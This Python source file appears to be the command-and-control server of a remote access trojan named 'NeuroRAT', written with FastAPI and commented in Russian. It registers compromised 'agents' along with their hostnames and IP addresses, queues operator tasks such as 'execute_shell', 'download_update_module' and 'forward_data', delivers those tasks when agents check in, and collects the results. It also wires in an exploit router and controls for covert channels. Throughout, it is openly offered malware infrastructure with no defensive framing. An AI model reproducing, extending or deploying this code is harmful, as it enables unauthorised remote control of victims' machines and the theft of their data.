from fastapi import FastAPI, HTTPException
from pydantic import BaseModel, Field
from src.common.utils import get_logger
from src.channel_manager import ChannelManager
from src.api.exploit import router as exploit_router
import uvicorn
import uuid  # Добавляем импорт uuid
import time  # Добавляем импорт time
from prometheus_client import generate_latest, CONTENT_TYPE_LATEST, CollectorRegistry, Counter
from fastapi.responses import Response
from typing import Dict, List, Any, Optional

# --- Модели для задач ---
class TaskResult(BaseModel):
    status: str # completed, failed
    output: Any = None # Command output or error message

class Task(BaseModel):
    task_id: str = Field(default_factory=lambda: str(uuid.uuid4())) # Unique ID generated by C2
    command: str  # e.g., "execute_shell", "download_update_module", "forward_data", "set_config"
    params: Dict[str, Any] = {}
    status: str = "pending" # e.g., pending, assigned, running, completed, failed
    submitted_at: float = Field(default_factory=time.time)
    result: Optional[TaskResult] = None # Store result later
    completed_at: Optional[float] = None

class TaskSubmission(BaseModel):
    command: str
    params: Dict[str, Any] = {}

# --- Модели для агентов ---
class AgentInfo(BaseModel):
    hostname: str | None = None
    os: str | None = None
    external_ip: str | None = None
    internal_ip: str | None = None
    agent_uuid: str | None = None # UUID, сгенерированный агентом (опционально)

class AgentRegistrationResponse(BaseModel):
    agent_id: str # Уникальный ID, присвоенный C2

class AgentCheckInResponse(BaseModel):
    tasks: List[Task] = [] # Теперь возвращаем список объектов Task

# --- Хранилища (временное решение) ---
registered_agents: Dict[str, Dict[str, Any]] = {}
agent_tasks: Dict[str, List[Task]] = {} # Словарь для хранения задач {agent_id: [task1, task2, ...]}

# --- Инициализация FastAPI и остального ---
app = FastAPI(
    title="NeuroRAT Admin API",
    version="0.1.0",
    description="REST API для управления NeuroRAT каналами и получения статистики"
)
app.include_router(exploit_router)
logger = get_logger("api")

# Инициализация менеджера каналов
manager = ChannelManager()

# Создаем счетчик запросов API
REQUEST_COUNTER = Counter('http_requests_total', 'Total HTTP Requests', ['method', 'endpoint', 'http_status'])

# Middleware для подсчета запросов
@app.middleware('http')
async def count_requests(request, call_next):
    response = await call_next(request)
    REQUEST_COUNTER.labels(method=request.method, endpoint=request.url.path, http_status=response.status_code).inc()
    return response

# Запускаем менеджер каналов при старте API
@app.on_event("startup")
def startup_event():
    success = manager.start()
    if not success:
        logger.error("Не удалось запустить ChannelManager при старте API")
    else:
        logger.info("ChannelManager запущен через API")

# Модель запроса для управления каналами
class ChannelAction(BaseModel):
    channel: str

# --- Эндпоинты для агентов ---

@app.post("/agents/register", response_model=AgentRegistrationResponse)
async def register_agent(agent_info: AgentInfo):
    """
    Регистрирует нового агента в системе C2.
    Принимает базовую информацию об агенте.
    Возвращает уникальный ID, присвоенный сервером.
    """
    agent_id = str(uuid.uuid4()) # Генерируем уникальный ID на сервере
    registration_time = time.time()

    agent_data = agent_info.model_dump()
    agent_data['agent_id'] = agent_id
    agent_data['registration_time'] = registration_time
    agent_data['last_seen'] = registration_time # Инициализируем время последнего контакта

    registered_agents[agent_id] = agent_data
    agent_tasks[agent_id] = [] # Инициализируем пустой список задач для нового агента
    logger.info(f"Зарегистрирован новый агент: ID={agent_id}, Hostname={agent_info.hostname}, OS={agent_info.os}, AgentUUID={agent_info.agent_uuid}")

    return AgentRegistrationResponse(agent_id=agent_id)

@app.get("/agents")
async def get_agents():
    """
    Возвращает список зарегистрированных агентов.
    """
    # Возвращаем копию, чтобы избежать изменения оригинала извне
    return {"agents": list(registered_agents.values())}

@app.post("/agents/{agent_id}/checkin", response_model=AgentCheckInResponse)
async def agent_checkin(agent_id: str):
    """
    Обрабатывает "check-in" от агента.
    Обновляет время последнего контакта.
    Возвращает список задач для агента (пока пустой).
    """
    if agent_id not in registered_agents:
        logger.warning(f"Попытка check-in от незарегистрированного агента: ID={agent_id}")
        raise HTTPException(status_code=404, detail="Агент не найден")

    current_time = time.time()
    registered_agents[agent_id]['last_seen'] = current_time
    logger.debug(f"Агент {agent_id} сделал check-in")

    # Собираем задачи со статусом pending и меняем статус на assigned
    tasks_to_send = []
    if agent_id in agent_tasks:
        for task in agent_tasks[agent_id]:
            if task.status == "pending":
                task.status = "assigned"
                tasks_to_send.append(task)
                logger.info(f"Отправка задачи {task.task_id} ({task.command}) агенту {agent_id}")

    return AgentCheckInResponse(tasks=tasks_to_send)

@app.post("/agents/{agent_id}/tasks", response_model=Task)
async def submit_task(agent_id: str, task_submission: TaskSubmission):
    """
    Принимает новую задачу для агента от оператора (админки).
    """
    if agent_id not in registered_agents:
        raise HTTPException(status_code=404, detail="Агент не найден")

    new_task = Task(
        command=task_submission.command,
        params=task_submission.params
    )
    
    if agent_id not in agent_tasks:
         agent_tasks[agent_id] = []
         
    agent_tasks[agent_id].append(new_task)
    logger.info(f"Добавлена новая задача {new_task.task_id} ({new_task.command}) для агента {agent_id}")
    
    return new_task

@app.post("/agents/{agent_id}/results/{task_id}")
async def submit_task_result(agent_id: str, task_id: str, result: TaskResult):
    """
    Принимает результат выполнения задачи от агента.
    """
    if agent_id not in registered_agents:
        raise HTTPException(status_code=404, detail="Агент не найден")
    
    if agent_id not in agent_tasks:
        raise HTTPException(status_code=404, detail="Задачи для агента не найдены")

    task_found = False
    for task in agent_tasks[agent_id]:
        if task.task_id == task_id:
            if task.status in ["assigned", "running"]: # Обновляем только если задача была назначена/выполнялась
                task.status = result.status
                task.result = result
                task.completed_at = time.time()
                logger.info(f"Получен результат для задачи {task_id} от агента {agent_id}. Статус: {result.status}")
                task_found = True
                break
            else:
                 logger.warning(f"Попытка обновить уже завершенную задачу {task_id} (статус: {task.status})")
                 task_found = True # Считаем найденной, но не обновляем
                 break

    if not task_found:
        raise HTTPException(status_code=404, detail=f"Задача {task_id} не найдена для агента {agent_id}")

    return {"message": "Результат задачи успешно принят"}

# --- Эндпоинты для управления каналами ---

# Получить список каналов и их статусы
@app.get("/channels")
def get_channels():
    stats = manager.get_statistics()
    return {"channels": list(stats.get('channels', {}).keys()), "stats": stats}

# Запустить указанный канал
@app.post("/channels/start")
def start_channel(action: ChannelAction):
    if action.channel not in manager.channels:
        raise HTTPException(status_code=404, detail="Канал не найден")
    result = manager.channels[action.channel].start()
    return {"channel": action.channel, "started": result}

# Остановить указанный канал
@app.post("/channels/stop")
def stop_channel(action: ChannelAction):
    if action.channel not in manager.channels:
        raise HTTPException(status_code=404, detail="Канал не найден")
    manager.channels[action.channel].stop()
    return {"channel": action.channel, "stopped": True}

# Общая остановка и запуск менеджера
@app.post("/manager/start")
def start_manager():
    result = manager.start()
    return {"manager_started": result}

@app.post("/manager/stop")
def stop_manager():
    manager.stop()
    return {"manager_stopped": True}

# Эндпоинт проверки здоровья
@app.get("/health")
def health_check():
    return {"status": "ok"}

# Endpoint метрик
@app.get('/metrics')
def metrics():
    registry = CollectorRegistry()
    registry.register(REQUEST_COUNTER)
    data = generate_latest(registry)
    return Response(data, media_type=CONTENT_TYPE_LATEST)

if __name__ == "__main__":
    uvicorn.run("src.api.app:app", host="0.0.0.0", port=8000, reload=True) 